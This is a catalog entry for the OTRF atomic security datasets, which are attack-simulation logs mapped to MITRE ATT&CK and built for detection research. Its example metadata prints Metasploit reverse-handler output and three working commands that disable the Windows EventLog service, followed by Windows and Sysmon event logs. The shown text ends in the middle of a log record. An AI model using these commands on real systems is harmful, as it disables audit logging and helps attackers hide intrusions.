---
title: OTFR Atomic Security Datasets
---

- [Overview](#overview)
- [Environment](#environment)
- [Activity](#activity)
- [Contained Data](#contained-data)
- [Links](#links)
- [Data Examples](#data-examples)

| <!-- -->                 | <!-- -->                                                                      |
|--------------------------|-------------------------------------------------------------------------------|
| **Network Data Source**  | pcaps, AWS CloudTrail                                                         |
| **Network Data Labeled** | "Yes", in the sense that only attack traffic is provided                      |
| **Host Data Source**     | Windows events, linux auditd                                                  |
| **Host Data Labeled**    | "Yes", in the sense that only attack events are provided                      |
|                          |                                                                               |
| **Overall Setting**      | Single OS                                                                     |
| **OS Types**             | Windows<br/>Linux                                                             |
| **Number of Machines**   | n/a                                                                           |
| **Total Runtime**        | n/a                                                                           |
| **Year of Collection**   | 2019-2022                                                                     |
| **Attack Categories**    | Most of MITRE's Att&ck matrix                                                 |
| **Benign Activity**      | None                                                                          |
|                          |                                                                               |
| **Packed Size**          | 125 MB                                                                        |
| **Unpacked Size**        | n/a                                                                           |
| **Download Link**        | [goto](https://github.com/OTRF/Security-Datasets/tree/master/datasets/atomic) |

***

### Overview

This is a subset of the Security Datasets Collection focusing on small datasets, each originating from a single attack
associated with a certain MITRE tactic and technique.
Due to their small granularity, all of these have been combined into a single entry here in this database.

### Environment

Details are provided per attack, though not all attacks provide the same amount of information.

### Activity

Details are provided per attack, though not all attacks provide the same amount of information.

### Contained Data

Content obviously differs between scenarios, and is generally divided into Windows, Linux, and AWS, though the vast
majority of data stems from Windows simulations.
For each of these groups, datasets are further divided depending on their corresponding tactic (execution, defense
evasion, etc.).
Finally, for each simulation, the following files exist

- A `yml` metadata file containing various information like attack and setup description
- Host and/or network log files, depending on scenario
    - Host logs come in the form of Windows events or linux audit logs as `.json` or `.log`, respectively
    - Network logs come in the form of packet captures or AWS CloudTrail logs as `.cap` or `.json`, respectively

It is not recommended to look through the metadata directly using the YAML file, the accompanying website picks this
information up and displays it in a nicer way (see example data below).
While the structure is consistent, the information that is actually presented is not - some for example describe the
specific victim and attacker OS used, others just don't.
None go into detail regarding any labeling, presumably expecting all logs to be considered malicious.

### Links

- [Homepage](https://securitydatasets.com/introduction.html)
- [GitHub](https://github.com/OTRF/Security-Datasets/tree/master/datasets/atomic)
- [AWS Datasets](https://securitydatasets.com/notebooks/atomic/aws/intro.html)
- [Linux Datasets](https://securitydatasets.com/notebooks/atomic/linux/intro.html)
- [Windows Datasets](https://securitydatasets.com/notebooks/atomic/windows/intro.html)

### Data Examples

Metadata for the scenario "Stopping Event Log Service via Modification of Start Up Type" (
see [webpage](https://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-220708104215.html)).
Taken from `datasets/atomic/_metadata/SDWIN-220708104215.yaml`.

```yml
title: Stopping Event Log Service via Modification of Start Up Type
id: SDWIN-220708104215
contributors:
- Jose Rodriguez @Cyb3rPandaH
creation_date: 2022/07/08
modification_date: 2022/08/04
platform:
- Windows
type: atomic
tags:
- powershell
- reg
- cmd
- eventlog
description: After getting a shell with elevated privileges on the target, we modified the start up type for the EventLog service to `Disabled`. After the modification, we need to restart our system to make the EventLog service unavailable (Disabled). This data set contains only before-reboot data of our simulation. Even though after-reboot data is not part of the dataset, our attempt to disable the EventLog service was successful during the simulation. We have simulated this attack using 3 different procedures REG command via cmd.exe, REG meterpreter command (Metasploit), and the PowerShell module (Metasploit). This dataset was generated using a Windows 10 Pro Evaluation edition (Version:1903,OS Build:18362.30) and Kali Linux (Version:2022.2).
attack_mappings:
  - technique: T1562
    sub-technique: "002"
    tactics:
      - TA0005
notebooks:
files:
- type: Host
  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_disable_eventlog_service_startuptype_modification.zip
- type: Host
  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_disable_eventlog_service_startuptype_modification_via_registry.zip
- type: Host
  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_disable_eventlog_service_startuptype_modification_via_registry.zip
simulation:
  environment: Lab VM
  tools:
    - type: Manual
      name: cmd
      module: cmd
      script: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmd
    - type: Manual
      name: Metasploit
      module: reg
      script: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/base/sessions/command_shell.rb
    - type: Manual
      name: Metasploit
      module: powershell
      script: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/windows/powershell.rb
  permissions_required:
    - Administrator
  adversary_view: |-
    **** Using reg command via cmd.exe:
    
    msf6 exploit(multi/handler) > run 
    [*] Started HTTPS reverse handler on https://192.168.56.40:8443 
    [*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: jhdxsqpv) Staging x64 payload (201308 bytes) ... 
    [*] Meterpreter session 20 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-04 11:20:26 -0400 

    meterpreter > shell 
    Process 7728 created. 
    Channel 1 created. 
    Microsoft Windows [Version 10.0.18362.30] 
    (c) 2019 Microsoft Corporation. All rights reserved. 
    C:\Users\IT01-Pedro\Downloads>REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog /t REG_DWORD /v Start /d 4
    REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog /t REG_DWORD /v Start /d 4 
    Value Start exists, overwrite(Yes/No)? yes 
    The operation completed successfully. 
    C:\Users\IT01-Pedro\Downloads>

    **** Using reg meterpreter command:
    
    msf6 exploit(multi/handler) > run 
    [*] Started HTTPS reverse handler on https://192.168.56.40:8443 
    [*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: r64afjpx) Staging x64 payload (201308 bytes) ... 
    [*] Meterpreter session 19 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-04 10:50:58 -0400 

    meterpreter > reg setval -k 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog' -v 'Start' -t 'REG_DWORD' -d 4 
    Successfully set Start of REG_DWORD. 
    meterpreter >

    **** Using PowerShell module:

    msf6 exploit(multi/handler) > run 
    [*] Started HTTPS reverse handler on https://192.168.56.40:8443 
    [*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: bgwdtwdi) Staging x64 payload (201308 bytes) ... 
    [*] Meterpreter session 21 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-04 11:36:38 -0400 

    meterpreter > load powershell 
    Loading extension powershell...Success. 
    meterpreter > powershell_execute "Set-Service -Name EventLog -StartUpType Disabled" 
    [+] Command execution completed: 
    meterpreter >
references:
- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2
- https://www.offensive-security.com/metasploit-unleashed/interacting-registry/
- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg
```

Snippet of Windows event logs corresponding to the entry above, taken
from `datasets/atomic/windows/defense_evasion/host /psh_disable_eventlog_service_startuptype_modification.json`.

```json
{
  "SourceName": "Microsoft-Windows-Security-Auditing",
  "ProviderGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
  "Level": "0",
  "Keywords": "0x8020000000000000",
  "Channel": "Security",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:37:04.983Z",
  "@timestamp": "2022-08-04T08:37:04.983Z",
  "EventID": 4663,
  "Message": "An attempt was made to access an object.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tLOCAL SERVICE\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E5\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tObject Type:\t\tKey\r\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\WMI\\Autologger\\EventLog-Application\\{2a45d52e-bbf3-4843-8e18-b356ed5f6a65}\r\n\tHandle ID:\t\t0x274\r\n\tResource Attributes:\t-\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x4c4\r\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\r\n\r\nAccess Request Information:\r\n\tAccesses:\t\tSet key value\r\n\t\t\t\t\r\n\tAccess Mask:\t\t0x2",
  "Task": "12801",
  "SubjectUserSid": "S-1-5-19",
  "SubjectUserName": "LOCAL SERVICE",
  "SubjectDomainName": "NT AUTHORITY",
  "SubjectLogonId": "0x3e5",
  "ObjectServer": "Security",
  "ObjectType": "Key",
  "ObjectName": "\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\WMI\\Autologger\\EventLog-Application\\{2a45d52e-bbf3-4843-8e18-b356ed5f6a65}",
  "HandleId": "0x274",
  "AccessList": "%%4433\n\t\t\t\t",
  "AccessMask": "0x2",
  "ProcessId": "0x4c4",
  "ProcessName": "C:\\Windows\\System32\\svchost.exe",
  "ResourceAttributes": "-"
}
{
  "SourceName": "Microsoft-Windows-Security-Auditing",
  "ProviderGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
  "Level": "0",
  "Keywords": "0x8020000000000000",
  "Channel": "Security",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:37:04.984Z",
  "@timestamp": "2022-08-04T08:37:04.984Z",
  "EventID": 4658,
  "Message": "The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tLOCAL SERVICE\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E5\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0x274\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x4c4\r\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe",
  "Task": "12801",
  "SubjectUserSid": "S-1-5-19",
  "SubjectUserName": "LOCAL SERVICE",
  "SubjectDomainName": "NT AUTHORITY",
  "SubjectLogonId": "0x3e5",
  "ObjectServer": "Security",
  "HandleId": "0x274",
  "ProcessId": "0x4c4",
  "ProcessName": "C:\\Windows\\System32\\svchost.exe"
}
{
  "SourceName": "Microsoft-Windows-Security-Auditing",
  "ProviderGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
  "Level": "0",
  "Keywords": "0x8020000000000000",
  "Channel": "Security",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:37:05.006Z",
  "@timestamp": "2022-08-04T08:37:05.006Z",
  "EventID": 4690,
  "Message": "An attempt was made to duplicate a handle to an object.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tLOCAL SERVICE\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E5\r\n\r\nSource Handle Information:\r\n\tSource Handle ID:\t0x274\r\n\tSource Process ID:\t0x4c4\r\n\r\nNew Handle Information:\r\n\tTarget Handle ID:\t0x35b8\r\n\tTarget Process ID:\t0x4",
  "Task": "12807",
  "SubjectUserSid": "S-1-5-19",
  "SubjectUserName": "LOCAL SERVICE",
  "SubjectDomainName": "NT AUTHORITY",
  "SubjectLogonId": "0x3e5",
  "SourceHandleId": "0x274",
  "SourceProcessId": "0x4c4",
  "TargetHandleId": "0x35b8",
  "TargetProcessId": "0x4"
}
{
  "SourceName": "Microsoft-Windows-Security-Auditing",
  "ProviderGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
  "Level": "0",
  "Keywords": "0x8020000000000000",
  "Channel": "Security",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:37:05.006Z",
  "@timestamp": "2022-08-04T08:37:05.006Z",
  "EventID": 4658,
  "Message": "The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tLOCAL SERVICE\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E5\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0x35b8\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x4c4\r\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe",
  "Task": "12801",
  "SubjectUserSid": "S-1-5-19",
  "SubjectUserName": "LOCAL SERVICE",
  "SubjectDomainName": "NT AUTHORITY",
  "SubjectLogonId": "0x3e5",
  "ObjectServer": "Security",
  "HandleId": "0x35b8",
  "ProcessId": "0x4c4",
  "ProcessName": "C:\\Windows\\System32\\svchost.exe"
}
{
  "SourceName": "Microsoft-Windows-Security-Auditing",
  "ProviderGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
  "Level": "0",
  "Keywords": "0x8020000000000000",
  "Channel": "Security",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:37:05.006Z",
  "@timestamp": "2022-08-04T08:37:05.006Z",
  "EventID": 4656,
  "Message": "A handle to an object was requested.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tLOCAL SERVICE\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E5\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tObject Type:\t\tKey\r\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\WMI\\Autologger\\EventLog-Application\r\n\tHandle ID:\t\t0x274\r\n\tResource Attributes:\t-\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x4c4\r\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\r\n\r\nAccess Request Information:\r\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\tAccesses:\t\tREAD_CONTROL\r\n\t\t\t\tQuery key value\r\n\t\t\t\tSet key value\r\n\t\t\t\tCreate sub-key\r\n\t\t\t\tEnumerate sub-keys\r\n\t\t\t\tNotify about changes to keys\r\n\t\t\t\t\r\n\tAccess Reasons:\t\t-\r\n\tAccess Mask:\t\t0x2001F\r\n\tPrivileges Used for Access Check:\t-\r\n\tRestricted SID Count:\t0",
  "Task": "12801",
  "SubjectUserSid": "S-1-5-19",
  "SubjectUserName": "LOCAL SERVICE",
  "SubjectDomainName": "NT AUTHORITY",
  "SubjectLogonId": "0x3e5",
  "ObjectServer": "Security",
  "ObjectType": "Key",
  "ObjectName": "\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\WMI\\Autologger\\EventLog-Application",
  "HandleId": "0x274",
  "TransactionId": "{00000000-0000-0000-0000-000000000000}",
  "AccessList": "%%1538\n\t\t\t\t%%4432\n\t\t\t\t%%4433\n\t\t\t\t%%4434\n\t\t\t\t%%4435\n\t\t\t\t%%4436\n\t\t\t\t",
  "AccessReason": "-",
  "AccessMask": "0x2001f",
  "PrivilegeList": "-",
  "RestrictedSidCount": "0",
  "ProcessId": "0x4c4",
  "ProcessName": "C:\\Windows\\System32\\svchost.exe",
  "ResourceAttributes": "-"
}
{
  "SourceName": "Microsoft-Windows-Security-Auditing",
  "ProviderGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
  "Level": "0",
  "Keywords": "0x8020000000000000",
  "Channel": "Security",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:37:05.006Z",
  "@timestamp": "2022-08-04T08:37:05.006Z",
  "EventID": 4663,
  "Message": "An attempt was made to access an object.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tLOCAL SERVICE\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E5\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tObject Type:\t\tKey\r\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\WMI\\Autologger\\EventLog-Application\r\n\tHandle ID:\t\t0x274\r\n\tResource Attributes:\t-\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x4c4\r\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\r\n\r\nAccess Request Information:\r\n\tAccesses:\t\tSet key value\r\n\t\t\t\t\r\n\tAccess Mask:\t\t0x2",
  "Task": "12801",
  "SubjectUserSid": "S-1-5-19",
  "SubjectUserName": "LOCAL SERVICE",
  "SubjectDomainName": "NT AUTHORITY",
  "SubjectLogonId": "0x3e5",
  "ObjectServer": "Security",
  "ObjectType": "Key",
  "ObjectName": "\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\WMI\\Autologger\\EventLog-Application",
  "HandleId": "0x274",
  "AccessList": "%%4433\n\t\t\t\t",
  "AccessMask": "0x2",
  "ProcessId": "0x4c4",
  "ProcessName": "C:\\Windows\\System32\\svchost.exe",
  "ResourceAttributes": "-"
}
{
  "SourceName": "Microsoft-Windows-Security-Auditing",
  "ProviderGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
  "Level": "0",
  "Keywords": "0x8020000000000000",
  "Channel": "Security",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:37:05.008Z",
  "@timestamp": "2022-08-04T08:37:05.008Z",
  "EventID": 4658,
  "Message": "The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tLOCAL SERVICE\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E5\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0x274\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x4c4\r\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe",
  "Task": "12801",
  "SubjectUserSid": "S-1-5-19",
  "SubjectUserName": "LOCAL SERVICE",
  "SubjectDomainName": "NT AUTHORITY",
  "SubjectLogonId": "0x3e5",
  "ObjectServer": "Security",
  "HandleId": "0x274",
  "ProcessId": "0x4c4",
  "ProcessName": "C:\\Windows\\System32\\svchost.exe"
}
{
  "SourceName": "Microsoft-Windows-Security-Auditing",
  "ProviderGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
  "Level": "0",
  "Keywords": "0x8020000000000000",
  "Channel": "Security",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:37:05.013Z",
  "@timestamp": "2022-08-04T08:37:05.013Z",
  "EventID": 4658,
  "Message": "The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tLOCAL SERVICE\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E5\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0xd30\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x4c4\r\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe",
  "Task": "12801",
  "SubjectUserSid": "S-1-5-19",
  "SubjectUserName": "LOCAL SERVICE",
  "SubjectDomainName": "NT AUTHORITY",
  "SubjectLogonId": "0x3e5",
  "ObjectServer": "Security",
  "HandleId": "0xd30",
  "ProcessId": "0x4c4",
  "ProcessName": "C:\\Windows\\System32\\svchost.exe"
}
{
  "SourceName": "Microsoft-Windows-Security-Auditing",
  "ProviderGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
  "Level": "0",
  "Keywords": "0x8020000000000000",
  "Channel": "Security",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:37:11.530Z",
  "@timestamp": "2022-08-04T08:37:11.530Z",
  "EventID": 4689,
  "Message": "A process has exited.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-968647429-258479840-2507984072-1002\r\n\tAccount Name:\t\tIT01-Pedro\r\n\tAccount Domain:\t\tPEDRO01\r\n\tLogon ID:\t\t0x3673C\r\n\r\nProcess Information:\r\n\tProcess ID:\t0xa1c\r\n\tProcess Name:\tC:\\Windows\\System32\\backgroundTaskHost.exe\r\n\tExit Status:\t0x1",
  "Task": "13313",
  "SubjectUserSid": "S-1-5-21-968647429-258479840-2507984072-1002",
  "SubjectUserName": "IT01-Pedro",
  "SubjectDomainName": "PEDRO01",
  "SubjectLogonId": "0x3673c",
  "Status": "0x1",
  "ProcessId": "0xa1c",
  "ProcessName": "C:\\Windows\\System32\\backgroundTaskHost.exe"
}
{
  "SourceName": "Microsoft-Windows-Sysmon",
  "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
  "Level": "4",
  "Keywords": "0x8000000000000000",
  "Channel": "Microsoft-Windows-Sysmon/Operational",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:36:14.593Z",
  "@timestamp": "2022-08-04T08:36:14.593Z",
  "EventID": 26,
  "Message": "File Delete logged:\r\nRuleName: -\r\nUtcTime: 2022-08-04 15:36:14.587\r\nProcessGuid: {625b42a0-4109-62e9-2600-000000000900}\r\nProcessId: 1408\r\nUser: NT AUTHORITY\\SYSTEM\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\SPPEXTCOMOBJ.EXE-BB03B3D6.pf\r\nHashes: SHA1=0E60B9DC43FD335F50E163573D8E700897184CC2,MD5=40F3175D55D34290D443EAD9F7BC763F,SHA256=717DB59D8D9F3606F839003A8B22750B80C39E4BF56E97D189839A34CEEDE49C,IMPHASH=00000000000000000000000000000000\r\nIsExecutable: false",
  "Task": "26",
  "RuleName": "-",
  "UtcTime": "2022-08-04 15:36:14.587",
  "ProcessGuid": "{625b42a0-4109-62e9-2600-000000000900}",
  "ProcessId": "1408",
  "User": "NT AUTHORITY\\SYSTEM",
  "Image": "C:\\Windows\\system32\\svchost.exe",
  "TargetFilename": "C:\\Windows\\Prefetch\\SPPEXTCOMOBJ.EXE-BB03B3D6.pf",
  "Hashes": "SHA1=0E60B9DC43FD335F50E163573D8E700897184CC2,MD5=40F3175D55D34290D443EAD9F7BC763F,SHA256=717DB59D8D9F3606F839003A8B22750B80C39E4BF56E97D189839A34CEEDE49C,IMPHASH=00000000000000000000000000000000",
  "IsExecutable": "false"
}
{
  "SourceName": "Microsoft-Windows-Sysmon",
  "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
  "Level": "4",
  "Keywords": "0x8000000000000000",
  "Channel": "Microsoft-Windows-Sysmon/Operational",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:36:14.594Z",
  "@timestamp": "2022-08-04T08:36:14.594Z",
  "EventID": 11,
  "Message": "File created:\r\nRuleName: -\r\nUtcTime: 2022-08-04 15:36:14.587\r\nProcessGuid: {625b42a0-4109-62e9-2600-000000000900}\r\nProcessId: 1408\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\SPPEXTCOMOBJ.EXE-BB03B3D6.pf\r\nCreationUtcTime: 2022-07-29 05:08:44.061\r\nUser: NT AUTHORITY\\SYSTEM",
  "Task": "11",
  "RuleName": "-",
  "UtcTime": "2022-08-04 15:36:14.587",
  "ProcessGuid": "{625b42a0-4109-62e9-2600-000000000900}",
  "ProcessId": "1408",
  "Image": "C:\\Windows\\system32\\svchost.exe",
  "TargetFilename": "C:\\Windows\\Prefetch\\SPPEXTCOMOBJ.EXE-BB03B3D6.pf",
  "CreationUtcTime": "2022-07-29 05:08:44.061",
  "User": "NT AUTHORITY\\SYSTEM"
}
{
  "SourceName": "Microsoft-Windows-Sysmon",
  "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
  "Level": "4",
  "Keywords": "0x8000000000000000",
  "Channel": "Microsoft-Windows-Sysmon/Operational",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:36:15.184Z",
  "@timestamp": "2022-08-04T08:36:15.184Z",
  "EventID": 10,
  "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2022-08-04 15:36:15.091\r\nSourceProcessGUID: {625b42a0-6b35-62e9-1200-000000000900}\r\nSourceProcessId: 888\r\nSourceThreadId: 3696\r\nSourceImage: C:\\Windows\\system32\\svchost.exe\r\nTargetProcessGUID: {625b42a0-4111-62e9-4600-000000000900}\r\nTargetProcessId: 2696\r\nTargetImage: C:\\Windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+6a685|c:\\windows\\system32\\lsm.dll+10225|C:\\Windows\\System32\\RPCRT4.dll+76963|C:\\Windows\\System32\\RPCRT4.dll+da036|C:\\Windows\\System32\\RPCRT4.dll+37a5c|C:\\Windows\\System32\\RPCRT4.dll+548d8|C:\\Windows\\System32\\RPCRT4.dll+2c931|C:\\Windows\\System32\\RPCRT4.dll+2c1eb|C:\\Windows\\System32\\RPCRT4.dll+1a86f|C:\\Windows\\System32\\RPCRT4.dll+19d1a|C:\\Windows\\System32\\RPCRT4.dll+19301|C:\\Windows\\System32\\RPCRT4.dll+18d6e|C:\\Windows\\System32\\RPCRT4.dll+169a5|C:\\Windows\\SYSTEM32\\ntdll.dll+333fd|C:\\Windows\\SYSTEM32\\ntdll.dll+34152|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71\r\nSourceUser: NT AUTHORITY\\SYSTEM\r\nTargetUser: NT AUTHORITY\\LOCAL SERVICE",
  "Task": "10",
  "RuleName": "-",
  "UtcTime": "2022-08-04 15:36:15.091",
  "SourceProcessGUID": "{625b42a0-6b35-62e9-1200-000000000900}",
  "SourceProcessId": "888",
  "SourceThreadId": "3696",
  "SourceImage": "C:\\Windows\\system32\\svchost.exe",
  "TargetProcessGUID": "{625b42a0-4111-62e9-4600-000000000900}",
  "TargetProcessId": "2696",
  "TargetImage": "C:\\Windows\\System32\\svchost.exe",
  "GrantedAccess": "0x1000",
  "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+6a685|c:\\windows\\system32\\lsm.dll+10225|C:\\Windows\\System32\\RPCRT4.dll+76963|C:\\Windows\\System32\\RPCRT4.dll+da036|C:\\Windows\\System32\\RPCRT4.dll+37a5c|C:\\Windows\\System32\\RPCRT4.dll+548d8|C:\\Windows\\System32\\RPCRT4.dll+2c931|C:\\Windows\\System32\\RPCRT4.dll+2c1eb|C:\\Windows\\System32\\RPCRT4.dll+1a86f|C:\\Windows\\System32\\RPCRT4.dll+19d1a|C:\\Windows\\System32\\RPCRT4.dll+19301|C:\\Windows\\System32\\RPCRT4.dll+18d6e|C:\\Windows\\System32\\RPCRT4.dll+169a5|C:\\Windows\\SYSTEM32\\ntdll.dll+333fd|C:\\Windows\\SYSTEM32\\ntdll.dll+34152|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71",
  "SourceUser": "NT AUTHORITY\\SYSTEM",
  "TargetUser": "NT AUTHORITY\\LOCAL SERVICE"
}
{
  "SourceName": "Microsoft-Windows-Sysmon",
  "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
  "Level": "4",
  "Keywords": "0x8000000000000000",
  "Channel": "Microsoft-Windows-Sysmon/Operational",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:36:15.184Z",
  "@timestamp": "2022-08-04T08:36:15.184Z",
  "EventID": 10,
  "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2022-08-04 15:36:15.091\r\nSourceProcessGUID: {625b42a0-6b35-62e9-1200-000000000900}\r\nSourceProcessId: 888\r\nSourceThreadId: 3696\r\nSourceImage: C:\\Windows\\system32\\svchost.exe\r\nTargetProcessGUID: {625b42a0-4111-62e9-4600-000000000900}\r\nTargetProcessId: 2696\r\nTargetImage: C:\\Windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+6a685|c:\\windows\\system32\\lsm.dll+108a0|C:\\Windows\\System32\\RPCRT4.dll+76963|C:\\Windows\\System32\\RPCRT4.dll+da036|C:\\Windows\\System32\\RPCRT4.dll+37a5c|C:\\Windows\\System32\\RPCRT4.dll+548d8|C:\\Windows\\System32\\RPCRT4.dll+2c931|C:\\Windows\\System32\\RPCRT4.dll+2c1eb|C:\\Windows\\System32\\RPCRT4.dll+1a86f|C:\\Windows\\System32\\RPCRT4.dll+19d1a|C:\\Windows\\System32\\RPCRT4.dll+19301|C:\\Windows\\System32\\RPCRT4.dll+18d6e|C:\\Windows\\System32\\RPCRT4.dll+169a5|C:\\Windows\\SYSTEM32\\ntdll.dll+333fd|C:\\Windows\\SYSTEM32\\ntdll.dll+34152|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71\r\nSourceUser: NT AUTHORITY\\SYSTEM\r\nTargetUser: NT AUTHORITY\\LOCAL SERVICE",
  "Task": "10",
  "RuleName": "-",
  "UtcTime": "2022-08-04 15:36:15.091",
  "SourceProcessGUID": "{625b42a0-6b35-62e9-1200-000000000900}",
  "SourceProcessId": "888",
  "SourceThreadId": "3696",
  "SourceImage": "C:\\Windows\\system32\\svchost.exe",
  "TargetProcessGUID": "{625b42a0-4111-62e9-4600-000000000900}",
  "TargetProcessId": "2696",
  "TargetImage": "C:\\Windows\\System32\\svchost.exe",
  "GrantedAccess": "0x1000",
